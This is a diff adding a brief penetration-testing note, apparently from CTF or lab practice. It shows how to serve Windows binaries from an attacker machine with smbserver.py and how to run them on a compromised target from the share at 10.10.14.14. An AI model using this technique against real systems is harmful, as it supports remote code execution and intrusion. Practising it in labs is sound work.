@@ -1,0 +1,9 @@
+smbserver.py to share stuff via smb
+
+example:
+
+smbserver.py a /usr/share/windows-binaries/
+
+on target:
+
+C:\WINDOWS\system32>\\10.10.14.14\a\whoami.exe
